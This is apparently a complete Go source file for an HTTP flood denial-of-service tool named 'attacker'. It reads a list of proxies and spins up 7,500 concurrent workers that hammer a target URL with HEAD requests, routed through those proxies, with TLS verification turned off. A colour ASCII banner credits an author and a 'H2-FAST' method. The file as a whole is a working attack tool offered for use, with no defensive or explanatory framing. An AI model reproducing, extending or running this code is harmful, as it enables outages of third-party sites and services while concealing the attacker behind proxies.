package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/term"
)

const (
	workers        = 7500
	requestTimeout = 6 * time.Second
	userAgent      = "curl/8.4.0"
)

const (
	HAPUS  = "\033[0m"
	MERAH  = "\033[31m"
	IJO    = "\033[32m"
	PUTIH  = "\033[37m"
	CANDY  = "\033[91m"
	PUCAT  = "\033[38;5;203m"
	PUNYAMU = "\033[38;5;204m"
	PUNYA_LU_PUCAT = "\033[38;5;218m"
	MASA_DEPAN_NYA = "\033[97m"
)

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func main() {
	if len(os.Args) < 3 {
		fmt.Print("Usage: ./attacker <target> <proxyfile>\r\n")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	proxyFile := os.Args[2]

	parsedURL, _ := url.Parse(targetURL)
	host := parsedURL.Hostname()
	if host == "" {
		host = targetURL
	}

	var proxies []*url.URL
	file, _ := os.Open(proxyFile)
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		pURL, err := url.Parse("http://" + strings.TrimSpace(scanner.Text()))
		if err == nil {
			proxies = append(proxies, pURL)
		}
	}
	file.Close()

	if len(proxies) == 0 {
		fmt.Print("Proxy Tidak Ada!\r\n")
		os.Exit(1)
	}

	clients := make([]*http.Client, len(proxies))
	for i, pURL := range proxies {
		clients[i] = &http.Client{
			Timeout: requestTimeout,
			Transport: &http.Transport{
				Proxy: http.ProxyURL(pURL),
				DialContext: (&net.Dialer{
					Timeout:   5 * time.Second,
					KeepAlive: 30 * time.Second,
				}).DialContext,
				MaxIdleConns:        5000,
				MaxIdleConnsPerHost: 5000,
				IdleConnTimeout:     60 * time.Second,
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
				},
				ForceAttemptHTTP2:     true,
				DisableCompression:    true,
				TLSHandshakeTimeout:   4 * time.Second,
				ResponseHeaderTimeout: 4 * time.Second,
			},
		}
	}

	reqTemplate, _ := http.NewRequest("HEAD", targetURL, nil)
	reqTemplate.Header.Set("User-Agent", userAgent)

	ctx, cancel := context.WithCancel(context.Background())

	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err == nil {
		defer term.Restore(int(os.Stdin.Fd()), oldState)
	}

	inputDone := make(chan struct{}, 1)

	go func() {
		b := make([]byte, 1)
		for {
			_, err := os.Stdin.Read(b)
			if err != nil {
				return
			}
			if b[0] >= 0x01 && b[0] <= 0x1A {
				cancel()
				select {
				case inputDone <- struct{}{}:
				default:
				}
				return
			}
			if b[0] == 'q' || b[0] == 'x' {
				cancel()
				select {
				case inputDone <- struct{}{}:
				default:
				}
				return
			}
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		client := clients[i%len(clients)]
		go func(c *http.Client) {
			defer wg.Done()
			for ctx.Err() == nil {
				req := reqTemplate.Clone(context.Background())
				resp, err := c.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}(client)
	}

	fmt.Printf("%s", MASA_DEPAN_NYA)
	fmt.Print("\r\n\r\n:::::::-.  :::::::::      .,~:::::    .:::.\r\n")
	fmt.Printf("%s", PUNYA_LU_PUCAT)
	fmt.Print(" ;;,   `';,'`````;;;    ,;;;'````'   ,;'``;.\r\n")
	fmt.Printf("%s", PUNYAMU)
	fmt.Print(" `[[     [[    .n[['    [[[          ''  ,['\r\n")
	fmt.Printf("%s", PUCAT)
	fmt.Print("  $$,    $$  ,$$P\" cccc $$$          .c$$P'\r\n")
	fmt.Printf("%s", MERAH)
	fmt.Print("  888_,o8P',888bo,_     `88bo,__,o, d88 _,oo,\r\n")
	fmt.Printf("%s", CANDY)
	fmt.Print("  MMMMP\"`   `\"\"*UMM       \"YUMMMMMP\"MMMUP*\"^^\r\n")
	fmt.Printf("%s", HAPUS)
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\r\n", MERAH, HAPUS)

	printInfo := func(label, value, status string) {
		if status != "" {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s %s%s%s\r\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS,
				MERAH, IJO, status, MERAH,
			)
		} else {
			fmt.Printf("%s〇%s %s%s%s %s:%s %s%s%s\r\n",
				IJO, HAPUS,
				PUTIH, label, HAPUS,
				MERAH, HAPUS,
				PUTIH, value, HAPUS)
		}
	}

	printInfo("Author", "Diz Flyze Ofc", "")
	printInfo("Target", host, "")
	printInfo("Port  ", "443", "")
	printInfo("Method", "H2-FAST", "")
	printInfo("Proxy ", "True", "")
	printInfo("HTTP  ", "HTTP/2", "")
	fmt.Printf("%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\r\n\r\n", MERAH, HAPUS)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM, syscall.SIGTSTP)

	select {
	case <-sigChan:
		cancel()
	case <-inputDone:
	}

	wg.Wait()
	fmt.Print("Stopped.\r\n")
}
